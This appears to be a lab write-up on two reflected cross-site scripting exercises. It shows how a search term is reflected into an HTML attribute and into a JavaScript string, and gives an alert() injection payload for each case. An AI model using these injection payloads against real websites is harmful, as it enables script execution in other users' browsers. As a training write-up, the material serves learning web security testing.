# Reflected XSS into attribute with angle brackets HTML encoded

### Scenario

We input a unique string like "uniquetest" and we search it in the "inspect element tab of the web browser".

```html
<h1>0 search results for 'uniquetest'</h1>
```

```html
<input type="text" placeholder="Search the blog..." name="search" value="uniquetest">
```

We notice that our string populated two element of the DOM.
One is a h1 string, **another is inside an attribute of a tag**.

### Exploit

So, we can break the tag using something like this:

```html
uniquetest" onmouseover=alert()
```

which will transform the "input tag" as following:
```html
<input type="text" placeholder="Search the blog..." name="search" value="uniquetest" onmouseover=alert()>
```

So, when we will mouse over the input element (a search bar), we will exploit the XSS vulnerability.

# Reflected XSS into a JS string with angle brackets HTML encoded

### Scenario

By inspecting the web page our inserted string is shown in three different position:

```html
<h1>0 search results for 'uniquetest'</h1>
```

```html
<img src="/resources/images/tracker.gif?searchTerms=uniquetest">
```

```javascript
var searchTerms = 'uniquetest';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

We will focus on the JS code.

This JS code assign our string to a variable and then uses this variable in a string concatenation.
Our input, as you can see above, is URL encoded before the string concatenation.

### Exploit

We can try to exploit the JS code where the variable assignment happens:

```
uniquetest'; alert(); let myvar = 'test
```

It will appear in the JS code as following:

```javascript
var searchTerms = 'uniquetest'; alert(); let myvar = 'test';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```
